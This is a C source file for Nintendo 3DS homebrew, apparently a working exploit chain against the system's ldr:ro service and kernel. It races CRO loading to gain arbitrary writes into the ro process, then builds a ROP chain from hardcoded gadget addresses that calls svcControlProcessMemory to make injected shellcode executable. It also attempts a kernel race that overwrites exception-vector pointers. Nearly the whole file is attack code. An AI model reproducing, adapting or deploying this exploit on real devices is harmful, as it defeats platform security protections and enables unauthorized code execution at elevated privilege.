#include <3ds.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <malloc.h>

#include "crr_bin.h"
#include "crs_bin.h"
#include "ro_command_handler_bin.h"

extern char* fake_heap_start;
extern char* fake_heap_end;
u32 __linear_heap;
u32 __heapBase;
extern u32 __heap_size, __linear_heap_size;

void __attribute__((weak)) __system_allocateHeaps() {
	u32 tmp=0;

	// Allocate the application heap
	__heapBase = 0x08000000;
	u32 heap_size = 8 * 1024 * 1024;
	svcControlMemory(&tmp, __heapBase, 0x0, heap_size, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE);

	// Allocate the linear heap
	svcControlMemory(&__linear_heap, 0x0, 0x0, __linear_heap_size, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);
	// Set up newlib heap
	fake_heap_start = (char*)__heapBase;
	fake_heap_end = fake_heap_start + heap_size;

}

void allocateHeapHax(u32 size, u32** main_mapping, u32** secondary_mapping)
{
	unsigned int* linear_buffer = linearMemAlign(0x1000, 0x1000);

	GX_SetTextureCopy(NULL, (void*)0x16000000, 0xFFFFFFFF, (void*)linear_buffer, 0xFFFFFFFF, 0x1000, 0x8);

	svcSleepThread(1 * 1000 * 1000);
	GSPGPU_InvalidateDataCache(NULL, (u8*)linear_buffer, 0x200);
	printf("data %08X %08X %08X %08X\n", linear_buffer[0], linear_buffer[1], linear_buffer[2], linear_buffer[3]);
	printf("data %08X %08X %08X %08X\n", linear_buffer[4], linear_buffer[5], linear_buffer[6], linear_buffer[7]);

	void* orig_header = malloc(0x200);
	memcpy(orig_header, linear_buffer, 0x200);

	{
		Result ret = svcControlMemory((u32*)main_mapping, (u32)*main_mapping, 0, size, 0x3, 0x3);
		printf("alloc %x %x\n", (unsigned int)ret, (unsigned int)*main_mapping);

		GX_SetTextureCopy(NULL, (void*)0x16000000, 0xFFFFFFFF, (void*)linear_buffer, 0xFFFFFFFF, 0x1000, 0x8);

		svcSleepThread(1 * 1000 * 1000);
		GSPGPU_InvalidateDataCache(NULL, (u8*)linear_buffer, 0x200);
		printf("data %08X %08X %08X %08X\n", linear_buffer[0], linear_buffer[1], linear_buffer[2], linear_buffer[3]);
		printf("data %08X %08X %08X %08X\n", linear_buffer[4], linear_buffer[5], linear_buffer[6], linear_buffer[7]);
	}

	{
		memcpy(linear_buffer, orig_header, 0x200);
		GSPGPU_FlushDataCache(NULL, (u8*)linear_buffer, 0x200);
		
		GX_SetTextureCopy(NULL, (void*)linear_buffer, 0xFFFFFFFF, (void*)0x16000000, 0xFFFFFFFF, 0x1000, 0x8);
		
		svcSleepThread(1 * 1000 * 1000);
	}

	{
		if(!*secondary_mapping) *secondary_mapping = (u32*)(((u32)*main_mapping) + size);
		Result ret = svcControlMemory((u32*)secondary_mapping, (u32)*secondary_mapping, 0, size, 0x3, 0x3);
		printf("alloc %x %x\n", (unsigned int)ret, (unsigned int)*secondary_mapping);

		if(ret) *secondary_mapping = NULL;

		GX_SetTextureCopy(NULL, (void*)0x16000000, 0xFFFFFFFF, (void*)linear_buffer, 0xFFFFFFFF, 0x1000, 0x8);

		svcSleepThread(1 * 1000 * 1000);
		GSPGPU_InvalidateDataCache(NULL, (u8*)linear_buffer, 0x200);
		printf("data %08X %08X %08X %08X\n", linear_buffer[0], linear_buffer[1], linear_buffer[2], linear_buffer[3]);
		printf("data %08X %08X %08X %08X\n", linear_buffer[4], linear_buffer[5], linear_buffer[6], linear_buffer[7]);
	}

	linearFree(linear_buffer);
}

Result LDRRO_Initialize(Handle* handle, void* crs_buf, u32 crs_size, u32 mirror_ptr)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x000100C2; //request header code
	cmdbuf[1]=(u32)crs_buf;
	cmdbuf[2]=crs_size;
	cmdbuf[3]=mirror_ptr;
	cmdbuf[4]=0x0;
	cmdbuf[5]=0xffff8001;

	Result ret=0;
	if((ret=svcSendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result LDRRO_LoadCrr(Handle* handle, void* crr_buf, u32 crr_size)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x00020082; //request header code
	cmdbuf[1]=(u32)crr_buf;
	cmdbuf[2]=crr_size;
	cmdbuf[3]=0x0;
	cmdbuf[4]=0xffff8001;

	Result ret=0;
	if((ret=svcSendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result LDRRO_LoadCro(Handle* handle, void* cro_buf, u32 cro_size, u32 cro_mirror, u32 data_ptr, u32 data_size, u32 bss_ptr, u32 bss_size)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x000402C2; //request header code
	cmdbuf[1]=(u32)cro_buf;
	cmdbuf[2]=cro_mirror;
	cmdbuf[3]=cro_size;
	cmdbuf[4]=data_ptr;
	cmdbuf[5]=0;
	cmdbuf[6]=data_size;
	cmdbuf[7]=bss_ptr;
	cmdbuf[8]=bss_size;
	cmdbuf[9]=0x0;
	cmdbuf[10]=0x1;
	cmdbuf[11]=0x0;
	cmdbuf[12]=0x0;
	cmdbuf[13]=0xffff8001;

	Result ret=0;
	if((ret=svcSendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result _HB_FlushInvalidateCache(Handle* handle)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x00010042; //request header code
	cmdbuf[1]=0;
	cmdbuf[2]=0;
	cmdbuf[3]=0xffff8001;

	Result ret=0;
	if((ret=svcSendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result HB_ControlProcessMemory(Handle* handle, u32 addr0, u32 addr1, u32 size, u32 type, u32 permissions)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x000A0142; //request header code
	cmdbuf[1]=addr0;
	cmdbuf[2]=addr1;
	cmdbuf[3]=size;
	cmdbuf[4]=type;
	cmdbuf[5]=permissions;
	cmdbuf[6]=0x0;
	cmdbuf[7]=0xffff8001;

	Result ret=0;
	if((ret=svcSendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

typedef struct
{
	Handle event;
	volatile u32* target;
	volatile u8* fail_target;
	u32 address;
	u32 num;
	u32 delay;
}raceParameters_s;

// u32 test[3] = {0, 0xFFFFFFFF, 2};
u32 test[3] = {1, 0xFFFFFFFF, 0};

void raceThread(volatile raceParameters_s* rp)
{
	while(1)
	{
		svcWaitSynchronization(rp->event, -1);
		volatile u32* target = rp->target;
		volatile u32* fail_target = (volatile u32*)rp->fail_target;
		if(target)
		{
			// printf("%08X\n", test[0]);
			while(*target == 0x1db004);
			volatile int i;
			for(i = 0; i < rp->delay; i++);
			// setup write primitive
			target[0] = rp->address;
			target[1] = rp->num;
			// setup fast fail path after write
			if(fail_target) *fail_target = 0x01;
			svcClearEvent(rp->event);
		}
	}

	svcExitThread();
}

Handle roHandle = 0;
u32 *crs_buf, *crs_mirror, *crr_buf, *crr_mirror;
u32 *cro_buf, *cro_mirror, *cro_orig;
u32 cro_size = 0;

raceParameters_s raceparam = {0};

void setupRoWrites()
{
	// crs_buf = (u32*)0x0d000000;
	// crs_mirror = (u32*)0x0d800000;
	// allocateHeapHax(crs_bin_size, &crs_buf, &crs_mirror);

	crs_buf = memalign(0x1000, crs_bin_size);
	memcpy(crs_buf, crs_bin, crs_bin_size);
	printf("ldr:ro handle %X\n", (unsigned int)roHandle);
	Result ret = LDRRO_Initialize(&roHandle, crs_buf, crs_bin_size, 0x02000000);
	printf("ldr:ro init %X\n", (unsigned int)ret);

	crr_buf = (u32*)0x0dead000;
	crr_mirror = NULL;
	allocateHeapHax(crr_bin_size, &crr_buf, &crr_mirror);

	if(crr_mirror)
	{
		memcpy(crr_buf, crr_bin, crr_bin_size);
		ret = LDRRO_LoadCrr(&roHandle, crr_buf, crr_bin_size);
		printf("ldr:ro crr %X\n", (unsigned int)ret);
	}

	FILE* f = fopen("sdmc:/oss.cro", "rb");
	fseek(f, 0, SEEK_END);
	cro_size = ftell(f);
	fseek(f, 0, SEEK_SET);

	cro_buf = (u32*)0x0b000000;
	cro_mirror = (u32*)0x0c000000;
	allocateHeapHax(cro_size, &cro_buf, &cro_mirror);

	cro_orig = malloc(cro_size);
	fread(cro_orig, 1, cro_size, f);
	fclose(f);

	u32* test_ptr = &cro_mirror[50];

	printf("cro %X %X %X %X\n", (unsigned int)cro_size, (unsigned int)cro_buf, (unsigned int)cro_mirror, (unsigned int)*test_ptr);
	printf("test %08X %08X %08X\n", (unsigned int)test[0], (unsigned int)test[1], (unsigned int)test[2]);
	Handle threadHandle = 0;
	u8* thread_stack = ((u8*)memalign(0x1000, 0x10000)) + 0x10000;
	raceparam = (raceParameters_s){0, test_ptr, NULL, 0, 1, 0x40};
	svcCreateEvent(&raceparam.event, 0);
	ret = svcCreateThread(&threadHandle, (ThreadFunc)raceThread, (u32)&raceparam, (u32*)thread_stack, 0x20, 0);
	printf("ldr:ro %X %X %X\n", (unsigned int)ret, (unsigned int)threadHandle, (unsigned int)thread_stack);
}

void doRoWrite(u32 address, u32 dst_address, u32 data_address, u32 bss_address, u32 num)
{
	printf("doRoWrite %08X %X %08X %08X\n", (unsigned int)address, (unsigned int)num, (unsigned int)data_address, (unsigned int)bss_address);
	Result ret = 0;
	int attempt = 0;
	if(raceparam.delay > 0x50) raceparam.delay = 0x50;
	while(1)
	{
		raceparam.address = address;
		raceparam.num = num;
		memcpy(cro_buf, cro_orig, cro_size);
		raceparam.fail_target = ((u8*)cro_mirror) + cro_mirror[56] + cro_mirror[57] - 1;
		ret = svcSignalEvent(raceparam.event);
		printf("ldr:ro %X %X ", (unsigned int)ret, (unsigned int)attempt);
		ret = LDRRO_LoadCro(&roHandle, cro_buf, cro_size, dst_address, data_address, 0xff020000, bss_address, 0xff020000);
		printf("%08X %08X %08X\r", (unsigned int)ret, (unsigned int)attempt, (unsigned int)raceparam.delay);
		attempt++;
		if(ret == 0xd9012c11) raceparam.delay++;
		else break;
	}
	printf("\n");
}

u32 ro_ldr_r2r1_ldr_r3r1x4_str_r2r0_str_r3r0x4_bxlr = 0x14004BD8;
u32 ro_svcControlProcessMemory = 0x14004FA8;
u32 ro_mov_r3r7_r2r9_r1r5_r0r4_bl_svcControlProcessMemory_add_spx8_mov_r0r6_pop_r4r5r6r7r8r9r10pc = 0x14003A94;
u32 ro_mov_r0r1_bx_lr = 0x14003EFA | 1;
u32 ro_mov_r0r4_pop_r4pc = 0x14006388;
u32 ro_pop_r1pc = 0x14003D0C;
u32 ro_pop_r4lr_nop_mov_r0x3000000_vmsr_fpscrr0_bxlr = 0x14001058;
u32 ro_pop_r4r5r6r7r8r9pc = 0x14002604;
u32 ro_pop_r3r4r5r6r7r8r9pc = 0x14003ec8;
u32 ro_pop_r4r5pc = 0x140066a0;
u32 ro_pop_r4pc = 0x1400638C;
u32 ro_pop_pc = 0x140063d0;
u32 ro_mov_r2r5_r1r6_r0r4_memmove = 0x14006310;
u32 ro_add_r0r4x4_mov_r2x80_bl_memcpy = 0x140013FC;
u32 ro_svc_x27_pop_r2_str_r1r2_add_spx4_bxlr = 0x140021C4;
u32 ro_pop_lr_lsls_r1r1x2_strcs_r2r0x4_bxeq_lr = 0x14003d44;

Handle wait_handles[256] = {0};
const int num_waits = sizeof(wait_handles) / sizeof(wait_handles[0]);

void wait_thread()
{
	s32 out = 0;

	svcWaitSynchronizationN(&out, wait_handles, num_waits, false, 0x0FFFFFFFFFFFFFFFll);

	svcExitThread();
}

u32* test_buf = (u32*)0x0dea0000;
u32* test_buf_mirror = NULL;

vu32 done = 1;

void ktest()
{
	// wait for other thread to be ready
	while(*(vu32*)&test_buf_mirror[0] == 0xdadadada) svcSleepThread(1 * 1000 * 1000);

	// go exploit stuff
	{
		// printf("test %08X\n", *(unsigned int*)0x00000000);
		printf("sup?\n");

		svcSleepThread(1 * 1000 * 1000);

		Handle thread_handles[16] = {0};
		const int num_threads = sizeof(thread_handles) / sizeof(thread_handles[0]);

		Handle wait_obj = 0;

		// svcCreatewait_obj(&wait_obj, true);
		svcCreateTimer(&wait_obj, 2);

		int i;
		for(i = 0; i < num_waits; i++) wait_handles[i] = wait_obj;

		for(i = 0; i < num_threads; i++)
		{
			const u32 stack_len = 0x1000;
			u8* stack = malloc(stack_len);

			// Result ret = svcCreateThread(&thread_handles[i], wait_thread, 0, (u32*)(stack + stack_len), 0x20, 0);
			Result ret = svcCreateThread(&thread_handles[i], wait_thread, 0, (u32*)(stack + stack_len), 0x20, 1);

			printf("thread %02d %08X %08X %08X\n", i, (unsigned int)thread_handles[i], (unsigned int)ret, (unsigned int)test_buf_mirror[2]);

			svcSleepThread(1 * 1000 * 1000);

			if(!done) break;
		}
	}

	printf("ktest done\n");

	svcExitThread();
}

u8* bottom_fb = NULL;

void hello()
{
	int i;
	for(i = 0; i < 240 * 300; i++)
	{
		bottom_fb[i * 3 + 0] = 0x00;
		bottom_fb[i * 3 + 1] = 0x00;
		bottom_fb[i * 3 + 2] = 0xFF;
	}

	while(1);
}

void speedracer()
{
	*(vu32*)&test_buf_mirror[0x0] = 0x00000040;

	// write a jmp instruction!
	*(vu32*)&test_buf_mirror[0x3] = 0xE51FF004; // ldr pc, [pc, #-4]
	*(vu32*)&test_buf_mirror[0x4] = (u32)&hello; // pc

	u32 val = 0;

	while(1)
	{
		val = *(vu32*)&test_buf_mirror[0x2];

		if(val != 0xdadadada)
		{
			// *(vu32*)0xdead0000 = val;
			break;
		}
	}

	while(1)
	{
		*(vu32*)&test_buf_mirror[0x0] = 0x00000040;
		// *(vu32*)&test_buf_mirror[0x1] = 0xdff80000 + 0x644; // exception vector
		*(vu32*)&test_buf_mirror[0x1] = 0xdff80000 + 0x638; // exception vector
		*(vu32*)&test_buf_mirror[0x2] = 0xb0b0b0b0;
		// *(vu32*)&test_buf_mirror[0x10] = 0xdff80000 + 0x644; // exception vector
		*(vu32*)&test_buf_mirror[0x10] = 0xdff80000 + 0x638; // exception vector
		*(vu32*)&test_buf_mirror[0x11] = 0xd0d0d0d0;
		*(vu32*)&test_buf_mirror[0x12] = val; // kthread
	}

	// svcExitThread();
}

int main(int argc, char **argv)
{
	gfxInitDefault();

	consoleInit(GFX_TOP, NULL);

	gfxSetDoubleBuffering(GFX_BOTTOM, false);
	bottom_fb = gfxGetFramebuffer(GFX_BOTTOM, GFX_LEFT, NULL, NULL);

	gfxSwapBuffers();
	gfxSwapBuffers();

	Result ret = srvGetServiceHandle(&roHandle, "ldr:ro");
	if(ret)
	{
		printf("failed to grab ldr:ro handle");
	}else{
		setupRoWrites();

		u32* ro_rop_buffer = (u32*)0x09030000;
		u32* ro_shellcode_buf = (u32*)0x09000000;
		Result ret = svcControlMemory((u32*)&ro_rop_buffer, (u32)ro_rop_buffer, 0, 0x1000, 0x3, 0x3);
		printf("rop %x %x\n", (unsigned int)ret, (unsigned int)ro_rop_buffer);
		ret = svcControlMemory((u32*)&ro_shellcode_buf, (u32)ro_shellcode_buf, 0, 0x4000, 0x3, 0x3);
		printf("shellcode %x %x\n", (unsigned int)ret, (unsigned int)ro_shellcode_buf);

		u32* ro_rop_start = &ro_rop_buffer[1];
		u32* ro_rop_data = &ro_rop_start[5];

		memset(ro_rop_start, 0xde, 0x80);
		memset(ro_shellcode_buf, 0xda, 0x80);

		// ro_shellcode_buf[0] = 0xe59f0004;
		// ro_shellcode_buf[1] = 0xe50f000c;
		// ro_shellcode_buf[2] = 0xFFFFFFFF; // infinite loop (0xeafffffe)
		// ro_shellcode_buf[3] = 0x0000dead;
		memcpy(ro_shellcode_buf, ro_command_handler_bin, ro_command_handler_bin_size);

		// write rop
		{
			// setup r4 and r5 for the memcpy
			doRoWrite(0x0fffffae, 0x00470000, 0, 0, 1);
			doRoWrite(0x0fffffa8, 0x03000000, 0, 0x10000000 - 0x80 - 4, 1); // R4 : dst - 0x4
			doRoWrite(0x0fffffa4, 0x03000000, ro_pop_r4r5pc, 0, 1); // gadget

			// setup ret addr for memcpy
			doRoWrite(0x0fffffb6, 0x00A30000, 0, 0, 1);
			doRoWrite(0x0fffffb0, 0x03000000, 0, ro_add_r0r4x4_mov_r2x80_bl_memcpy, 1);

			// setup rop src (0x09030000)
			doRoWrite(0x0fffffa0, 0x03000000, 0, 0, 1);
			doRoWrite(0x0fffffa0, 0x03000000, 0, 0, 1);
			doRoWrite(0x0fffffa0, 0x03000000, 0, 0, 1);
		}

		// write rop
		{
			u32 rop_chain[] = {
				// implicit pop {r4, r5, r6, r7, r8, r9, r10, lr}; bx lr;
					0, // r4 : garbage
					(u32)ro_shellcode_buf, // r5 : r1, addr0
					0, // r6 : garbage
					0x1000, // r7 : r3, size
					0, // r8 : garbage
					0, // r9 : r2, addr1
					0, // r10 : garbage
					ro_pop_pc, // lr
				ro_pop_r1pc,
					0xffff8001, // r1
				ro_svc_x27_pop_r2_str_r1r2_add_spx4_bxlr,
					0x0fffffc8, // r2 : label1 address
				ro_pop_r4pc,
					0xdead, // r4 : r0, process handle (label1)
				ro_mov_r3r7_r2r9_r1r5_r0r4_bl_svcControlProcessMemory_add_spx8_mov_r0r6_pop_r4r5r6r7r8r9r10pc,
					0x6, // operation : protect
					0x7, // permissions : rwx
					0, // r4 : garbage
					0, // r5 : garbage
					0, // r6 : garbage
					0, // r7 : garbage
					0, // r8 : garbage
					0, // r9 : garbage
					0, // r10 : garbage
				(u32)ro_shellcode_buf
			};

			memcpy(ro_rop_data, rop_chain, sizeof(rop_chain));
		}

		// trigger rop
		{
			// NOTE: this technique requires that both bss and data section sizes be set to 0xff020000
			
			// 0x03 at 0x0fffffa2 (for 0x0fffff9c partial overwrite)
			doRoWrite(0x0fffff9f, 0x03000000, 0x3, 0, 1);

			// perform multi-write to overwrite both retaddr at 0x0ffffedc (to skip unmap) and 0x0fffff9c (to trigger rop)
			doRoWrite(0x0ffffedc - 0x2, 0x03000000, 0x2F9C0000, ro_pop_r1pc << 16, 0x11);
		}

		printf("value %08X\n", (unsigned int)ro_shellcode_buf[0]);

		// // test
		// u32* test_buf = linearMemAlign(0x1000, 0x1000);
		// ret = HB_ControlProcessMemory(&roHandle, (u32)test_buf, 0, 0x1000, 6, 7);
		// printf("ret %08X %08X\n", (unsigned int)ret, (unsigned int)test_buf);
		// test_buf[0] = 0xE59F0000; // ldr r0, =...
		// test_buf[1] = 0xE12FFF1E; // bx lr
		// test_buf[2] = 0xdeadbabe; // ...
		// ret = GSPGPU_FlushDataCache(NULL, (u8*)test_buf, 0x1000);
		// printf("ret %08X\n", (unsigned int)ret);
		// ret = _HB_FlushInvalidateCache(&roHandle);
		// printf("ret %08X\n", (unsigned int)ret);
		// u32 val = ((u32 (*)(void))test_buf)();
		// printf("val %08X\n", (unsigned int)val);

		aptOpenSession();
		APT_SetAppCpuTimeLimit(NULL, 30);
		aptCloseSession();

		// set max priority on current thread
		svcSetThreadPriority(0xFFFF8000, 0x19);

		const u32 stack_len = 0x10000;
		u8* stack = malloc(stack_len);
		
		test_buf = memalign(0x1000, 0x1000);
		memset(test_buf, 0xda, 0x1000);

		// map to 0
		ret = HB_ControlProcessMemory(&roHandle, (u32)test_buf_mirror, (u32)test_buf, 0x1000, MEMOP_MAP, MEMPERM_READ | MEMPERM_WRITE | MEMPERM_EXECUTE);
		printf("ret %08X %08X\n", (unsigned int)ret, (unsigned int)test_buf);

		if(!ret)
		{
			Handle thread = 0;
			
			// ret = svcCreateThread(&thread, speedracer, 0, (u32*)(stack + stack_len), 0x20, 1);
			ret = svcCreateThread(&thread, ktest, 0, (u32*)(stack + stack_len), 0x20, 1);

			printf("hi\n");

			// ktest();
			speedracer();
		}
	}

	// Main loop
	while (aptMainLoop())
	{
		//Scan all the inputs. This should be done once for each frame
		hidScanInput();

		//hidKeysDown returns information about which buttons have been just pressed (and they weren't in the previous frame)
		u32 kDown = hidKeysDown();

		if (kDown & KEY_START) break; // break in order to return to hbmenu

		// Flush and swap framebuffers
		gfxFlushBuffers();
		gfxSwapBuffers();

		//Wait for VBlank
		gspWaitForVBlank();
	}

	gfxExit();
	return 0;
}